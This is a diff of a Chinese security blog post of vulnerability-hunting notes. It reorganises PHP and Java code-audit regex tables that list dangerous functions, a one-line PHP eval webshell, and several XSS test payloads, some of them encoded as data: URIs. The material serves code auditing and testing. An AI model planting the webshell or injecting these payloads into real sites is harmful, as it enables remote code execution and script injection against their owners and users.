@@ -6,15 +6,15 @@
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="HandheldFriendly" content="True">
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
-    <meta name="description" content="0x01 常用Payload1&lt;img src&#x3D;&quot;#&quot; onerror&#x3D;&quot;javascript:console.log(&#39;xss_success&#39;);&quot; &#x2F;&gt;  1&lt;script&gt;console.log(&#39;xss_success&#39;);&lt;&#x2F;script&gt;  1&lt;img src&#x3D;&quot;#&quot; onerror&#x3D;&quot;javascript:location.href&#x3D;&#39;ht">
+    <meta name="description" content="0x01 PHP1.1 代码审计搜索常用正则表达式   漏洞类型 正则表达式    获取用户输入 &#96;$_SERVER   框架SQL注入 -&gt;query\(   代码执行 &#96;eval(   命令执行 &#96;system(   文件包含 &#96;require(   文件写入 &#96;fwrite(   文件删除 unlink\(   变量覆盖 extract\(   反序列化 unserialize\(">
 <meta property="og:type" content="article">
 <meta property="og:title" content="漏洞挖掘笔记">
 <meta property="og:url" content="https://xshisme.github.io/2020/05/14/%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E7%AC%94%E8%AE%B0/index.html">
 <meta property="og:site_name" content="Oah&#39;s Blog">
-<meta property="og:description" content="0x01 常用Payload1&lt;img src&#x3D;&quot;#&quot; onerror&#x3D;&quot;javascript:console.log(&#39;xss_success&#39;);&quot; &#x2F;&gt;  1&lt;script&gt;console.log(&#39;xss_success&#39;);&lt;&#x2F;script&gt;  1&lt;img src&#x3D;&quot;#&quot; onerror&#x3D;&quot;javascript:location.href&#x3D;&#39;ht">
+<meta property="og:description" content="0x01 PHP1.1 代码审计搜索常用正则表达式   漏洞类型 正则表达式    获取用户输入 &#96;$_SERVER   框架SQL注入 -&gt;query\(   代码执行 &#96;eval(   命令执行 &#96;system(   文件包含 &#96;require(   文件写入 &#96;fwrite(   文件删除 unlink\(   变量覆盖 extract\(   反序列化 unserialize\(">
 <meta property="og:locale" content="en_US">
 <meta property="article:published_time" content="2020-05-14T01:03:15.000Z">
-<meta property="article:modified_time" content="2020-08-26T03:24:56.913Z">
+<meta property="article:modified_time" content="2020-08-27T08:27:35.443Z">
 <meta property="article:author" content="Oah">
 <meta property="article:tag" content="Web安全">
 <meta name="twitter:card" content="summary">
@@ -110,7 +110,7 @@
 
     </div>
     <div id="toc">
-      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01-常用Payload"><span class="toc-number">1.</span> <span class="toc-text">0x01 常用Payload</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02-PHP代码审计常用正则"><span class="toc-number">2.</span> <span class="toc-text">0x02 PHP代码审计常用正则</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x03-PHP代码审计技巧"><span class="toc-number">3.</span> <span class="toc-text">0x03 PHP代码审计技巧</span></a></li></ol>
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01-PHP"><span class="toc-number">1.</span> <span class="toc-text">0x01 PHP</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-1-代码审计搜索常用正则表达式"><span class="toc-number">1.1.</span> <span class="toc-text">1.1 代码审计搜索常用正则表达式</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1-2-代码审计常用函数"><span class="toc-number">1.2.</span> <span class="toc-text">1.2 代码审计常用函数</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1-3-一句话木马"><span class="toc-number">1.3.</span> <span class="toc-text">1.3 一句话木马</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02-XSS"><span class="toc-number">2.</span> <span class="toc-text">0x02 XSS</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#2-1-常用Payload"><span class="toc-number">2.1.</span> <span class="toc-text">2.1 常用Payload</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x03-Java"><span class="toc-number">3.</span> <span class="toc-text">0x03 Java</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#3-1-代码审计搜索常用正则表达式"><span class="toc-number">3.1.</span> <span class="toc-text">3.1 代码审计搜索常用正则表达式</span></a></li></ol></li></ol>
     </div>
   </span>
 </div>
@@ -154,46 +154,59 @@
   
 
   <div class="content" itemprop="articleBody">
-    <h2 id="0x01-常用Payload"><a href="#0x01-常用Payload" class="headerlink" title="0x01 常用Payload"></a>0x01 常用Payload</h2><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">"#"</span> <span class="attr">onerror</span>=<span class="string">"javascript:console.log('xss_success');"</span> /&gt;</span></span><br></pre></td></tr></table></figure>
-
-<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;<span class="built_in">console</span>.log(<span class="string">'xss_success'</span>);&lt;<span class="regexp">/script&gt;</span></span><br></pre></td></tr></table></figure>
-
-<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">"#"</span> <span class="attr">onerror</span>=<span class="string">"javascript:location.href='http://www.baidu.com';"</span> /&gt;</span></span><br></pre></td></tr></table></figure>
-
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> phpinfo();<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">eval</span>($GET_[<span class="string">'cmd'</span>]);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">data:text&#x2F;html;base64,PHNjcmlwdD5hbGVydCgzKTwvc2NyaXB0Pg&#x3D;&#x3D;</span><br><span class="line">data:text&#x2F;html;%3C%73%63%72%69%70%74%3E%61%6C%65%72%74%2829%29%3C%2F%73%63%72%69%70%74%3E</span><br></pre></td></tr></table></figure>
-
-<h2 id="0x02-PHP代码审计常用正则"><a href="#0x02-PHP代码审计常用正则" class="headerlink" title="0x02 PHP代码审计常用正则"></a>0x02 PHP代码审计常用正则</h2><p>获取用户输入</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">\$_SERVER|\$_COOKIE|\$_REQUEST|\$_GET|\$_POST</span><br></pre></td></tr></table></figure>
-
-<p>SQL注入</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-&gt;query\(</span><br></pre></td></tr></table></figure>
-
-<p>命令执行</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">eval\(|assert\(|system\(|shell_ecex\(</span><br></pre></td></tr></table></figure>
-
-<p>文件包含</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">require\(|require_once\(|include\(|include_once\(</span><br></pre></td></tr></table></figure>
-
-<p>文件读取，写入，删除</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">readfile\(|file_get_contents\(|file_put_contents\(|file\(|fopen\(|fwrite\(|highlight_file\(|show_source\(|unlink</span><br></pre></td></tr></table></figure>
-
-<p>XXE</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">simplexml_load_string</span><br></pre></td></tr></table></figure>
-
-<p>反序列化漏洞</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">unserialize</span><br></pre></td></tr></table></figure>
-
-<p>XSS</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">htmlspecialchars_decode</span><br></pre></td></tr></table></figure>
-
-<p>phar</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fileatime\(|filectime\(|file_exists\(|file_get_contents\(|file_put_contents\(|file\(|filegroup\(|fopen\(|fileinode\(|filemtime\(|fileowner\(|fileperms\(|is_dir\(|is_executable\(|is_file\(|is_link\(|is_readable\(|is_writable\(|is_writeable\(|parse_ini_file\(|copy\(|unlink\(|stat\(|readfile\(</span><br></pre></td></tr></table></figure>
-
-<h2 id="0x03-PHP代码审计技巧"><a href="#0x03-PHP代码审计技巧" class="headerlink" title="0x03 PHP代码审计技巧"></a>0x03 PHP代码审计技巧</h2><p>打印所有常量</p>
+    <h2 id="0x01-PHP"><a href="#0x01-PHP" class="headerlink" title="0x01 PHP"></a>0x01 PHP</h2><h3 id="1-1-代码审计搜索常用正则表达式"><a href="#1-1-代码审计搜索常用正则表达式" class="headerlink" title="1.1 代码审计搜索常用正则表达式"></a>1.1 代码审计搜索常用正则表达式</h3><table>
+<thead>
+<tr>
+<th>漏洞类型</th>
+<th>正则表达式</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>获取用户输入</td>
+<td>`$_SERVER</td>
+</tr>
+<tr>
+<td>框架SQL注入</td>
+<td><code>-&gt;query\(</code></td>
+</tr>
+<tr>
+<td>代码执行</td>
+<td>`eval(</td>
+</tr>
+<tr>
+<td>命令执行</td>
+<td>`system(</td>
+</tr>
+<tr>
+<td>文件包含</td>
+<td>`require(</td>
+</tr>
+<tr>
+<td>文件写入</td>
+<td>`fwrite(</td>
+</tr>
+<tr>
+<td>文件删除</td>
+<td><code>unlink\(</code></td>
+</tr>
+<tr>
+<td>变量覆盖</td>
+<td><code>extract\(</code></td>
+</tr>
+<tr>
+<td>反序列化</td>
+<td><code>unserialize\(</code></td>
+</tr>
+<tr>
+<td>XXE</td>
+<td><code>simplexml_load_string\(</code></td>
+</tr>
+<tr>
+<td>XSS</td>
+<td><code>htmlspecialchars_decode\(</code></td>
+</tr>
+</tbody></table>
+<h3 id="1-2-代码审计常用函数"><a href="#1-2-代码审计常用函数" class="headerlink" title="1.2 代码审计常用函数"></a>1.2 代码审计常用函数</h3><p>打印所有常量</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">var_dump(get_defined_constants(<span class="keyword">true</span>));</span><br></pre></td></tr></table></figure>
 
 <p>打印用户定义的常量</p>
@@ -201,6 +214,40 @@
 
 <p>打印所有变量</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">var_dump(get_defined_vars());</span><br></pre></td></tr></table></figure>
+
+<h3 id="1-3-一句话木马"><a href="#1-3-一句话木马" class="headerlink" title="1.3 一句话木马"></a>1.3 一句话木马</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> phpinfo();<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">eval</span>($GET_[<span class="string">'cmd'</span>]);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="0x02-XSS"><a href="#0x02-XSS" class="headerlink" title="0x02 XSS"></a>0x02 XSS</h2><h3 id="2-1-常用Payload"><a href="#2-1-常用Payload" class="headerlink" title="2.1 常用Payload"></a>2.1 常用Payload</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">"#"</span> <span class="attr">onerror</span>=<span class="string">"javascript:console.log('xss_success');"</span> /&gt;</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;<span class="built_in">console</span>.log(<span class="string">'xss_success'</span>);&lt;<span class="regexp">/script&gt;</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">"#"</span> <span class="attr">onerror</span>=<span class="string">"javascript:location.href='http://www.baidu.com';"</span> /&gt;</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">data:text&#x2F;html;base64,PHNjcmlwdD5hbGVydCgzKTwvc2NyaXB0Pg&#x3D;&#x3D;</span><br><span class="line">data:text&#x2F;html;%3C%73%63%72%69%70%74%3E%61%6C%65%72%74%2829%29%3C%2F%73%63%72%69%70%74%3E</span><br></pre></td></tr></table></figure>
+
+<h2 id="0x03-Java"><a href="#0x03-Java" class="headerlink" title="0x03 Java"></a>0x03 Java</h2><h3 id="3-1-代码审计搜索常用正则表达式"><a href="#3-1-代码审计搜索常用正则表达式" class="headerlink" title="3.1 代码审计搜索常用正则表达式"></a>3.1 代码审计搜索常用正则表达式</h3><table>
+<thead>
+<tr>
+<th>漏洞类型</th>
+<th>正则表达式</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>命令执行</td>
+<td><code>getRuntime().exec</code></td>
+</tr>
+<tr>
+<td>SQL注入</td>
+<td><code>&quot;select[\S\s]*?append</code></td>
+</tr>
+<tr>
+<td>反序列化</td>
+<td><code>readObject</code></td>
+</tr>
+</tbody></table>
+
   </div>
 </article>
 
@@ -227,7 +274,7 @@
     </div>
 
     <div id="toc-footer" style="display: none">
-      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01-常用Payload"><span class="toc-number">1.</span> <span class="toc-text">0x01 常用Payload</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02-PHP代码审计常用正则"><span class="toc-number">2.</span> <span class="toc-text">0x02 PHP代码审计常用正则</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x03-PHP代码审计技巧"><span class="toc-number">3.</span> <span class="toc-text">0x03 PHP代码审计技巧</span></a></li></ol>
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01-PHP"><span class="toc-number">1.</span> <span class="toc-text">0x01 PHP</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-1-代码审计搜索常用正则表达式"><span class="toc-number">1.1.</span> <span class="toc-text">1.1 代码审计搜索常用正则表达式</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1-2-代码审计常用函数"><span class="toc-number">1.2.</span> <span class="toc-text">1.2 代码审计常用函数</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1-3-一句话木马"><span class="toc-number">1.3.</span> <span class="toc-text">1.3 一句话木马</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02-XSS"><span class="toc-number">2.</span> <span class="toc-text">0x02 XSS</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#2-1-常用Payload"><span class="toc-number">2.1.</span> <span class="toc-text">2.1 常用Payload</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x03-Java"><span class="toc-number">3.</span> <span class="toc-text">0x03 Java</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#3-1-代码审计搜索常用正则表达式"><span class="toc-number">3.1.</span> <span class="toc-text">3.1 代码审计搜索常用正则表达式</span></a></li></ol></li></ol>
     </div>
 
     <div id="share-footer" style="display: none">
